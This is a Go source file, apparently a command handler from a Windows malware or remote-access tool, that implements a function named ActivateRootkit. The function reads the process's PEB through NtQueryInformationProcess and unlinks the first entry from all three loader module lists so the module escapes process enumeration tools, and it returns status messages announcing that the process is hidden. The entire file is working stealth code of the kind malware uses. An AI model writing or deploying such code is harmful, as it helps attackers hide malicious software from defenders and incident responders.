package handlers

import (
	"fmt"
	"unsafe"
	"golang.org/x/sys/windows"
)

type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

type peb struct {
	_   [24]byte
	Ldr uintptr 
}

type pebLdrData struct {
	_                               [40]byte
	InLoadOrderModuleList           listEntry
	InMemoryOrderModuleList         listEntry
	InInitializationOrderModuleList listEntry 
}

type listEntry struct {
	Flink *listEntry 
	Blink *listEntry 
}

var (
	ntdll                         = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	hidden                        = false 
)

// ActivateRootkit - PEB manipulation for process hiding unlinks our module from loader lists to evade basic enum tools
func ActivateRootkit() string {
	if hidden {
		return "⚠️ Process is already hidden."
	}
	
	var pbi processBasicInformation
	ret, _, err := procNtQueryInformationProcess.Call(
		uintptr(windows.CurrentProcess()),
		0, 
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)
	
	if ret != 0 {
		return fmt.Sprintf("❌ Rootkit: NtQueryInformationProcess failed (code: %x, error: %v)", ret, err)
	}
	
	// navigate PEB structure to access loader data
	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))
	ldr := (*pebLdrData)(unsafe.Pointer(pebPtr.Ldr))
	
	// unlink from all three module lists for maximum stealth
	firstModuleLoadOrder := ldr.InLoadOrderModuleList.Flink
	unlink(firstModuleLoadOrder)
	
	firstModuleMemoryOrder := ldr.InMemoryOrderModuleList.Flink
	unlink(firstModuleMemoryOrder)
	
	firstModuleInitOrder := ldr.InInitializationOrderModuleList.Flink
	unlink(firstModuleInitOrder)
	
	hidden = true
	return "✅ **Rootkit Activated:** Process is now hidden from standard enumeration tools that check PEB"
}

// unlink - classic doubly-linked list manipulation removes our entry from loader chains
func unlink(le *listEntry) {
	le.Flink.Blink = le.Blink
	le.Blink.Flink = le.Flink
}